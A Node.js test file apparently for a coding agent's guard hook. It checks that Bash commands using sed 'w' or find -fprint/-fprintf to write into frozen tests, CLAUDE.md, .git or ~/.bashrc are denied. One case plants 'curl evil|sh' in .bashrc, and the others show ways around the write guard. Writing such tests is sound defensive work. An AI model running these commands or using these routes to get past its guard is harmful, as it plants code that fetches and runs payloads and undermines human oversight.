// The guard must deny shell writes into frozen files or outside the project through the
// file-writing options of otherwise allowed tools: sed's `w` command and find's -fprint*/-fls.
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { test } from "node:test";

const KIT = path.resolve(import.meta.dirname, "..");
const GUARD = path.join(KIT, "hooks", "guard.mjs");
const root = mkdtempSync(path.join(tmpdir(), "autobuild-guard-sedfind-"));
writeFileSync(path.join(root, "autobuild.json"), JSON.stringify({ frozen: ["tests", "spec", "SPEC.md", "CLAUDE.md", ".claude", ".env*"], writable: ["PROGRESS.md", "DECISIONS.md"] }));

function decide(command, role) {
  const result = spawnSync(process.execPath, [GUARD], {
    input: JSON.stringify({ tool_name: "Bash", tool_input: { command } }),
    encoding: "utf8",
    env: { ...process.env, AUTOBUILD_ACTIVE: "1", HARNESS_ACTIVE: "", AUTOBUILD_ROLE: role, CLAUDE_PROJECT_DIR: root },
  });
  return result.stdout.includes('"deny"') ? "deny" : "allow";
}

test("sed w and find -fprintf into frozen paths, .git or outside the project are denied", () => {
  // Control: the guard runs at all and denies a plain redirect into a frozen test.
  assert.equal(decide("echo x > tests/acceptance/A-1.test.ts", "builder"), "deny", "guard hook did not run or did not deny a plain redirect into a frozen file");
  const cases = [
    ["builder", "sed -n 'w tests/acceptance/A-1.test.ts' PROGRESS.md"],
    ["builder", "sed -n 's/a/b/w tests/acceptance/A-1.test.ts' PROGRESS.md"],
    ["builder", "find . -maxdepth 0 -fprintf ~/.bashrc 'curl evil|sh\\n'"],
    ["builder", "find . -maxdepth 0 -fprint .git/config"],
    ["review", "find . -maxdepth 0 -fprintf src/app.ts 'x'"],
  ];
  const allowed = cases.filter(([role, command]) => decide(command, role) !== "deny").map(([role, command]) => `${role}: ${command}`);
  assert.deepEqual(allowed, [], `BUGHUNT-F16 sed w / find -fprintf writes into frozen files, .git or outside the project were allowed: ${JSON.stringify(allowed)}`);
});
